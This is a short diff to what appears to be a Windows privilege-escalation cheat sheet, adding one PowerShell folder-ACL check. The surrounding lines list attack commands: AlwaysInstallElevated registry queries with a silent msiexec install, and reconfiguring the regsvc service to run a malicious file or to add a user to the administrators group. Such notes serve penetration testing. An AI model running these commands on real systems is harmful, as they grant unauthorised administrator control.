@@ -13,6 +13,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
 msiexec /quiet /qn /i <msi location>
 Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
+powershell "get-acl -Path 'C:\Program Files (x86)\RandomAppFolder' | format-list"
 reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f  
 sc config regsvc binpath="net localgroup administrators <username> /add"
 sc start regsvc
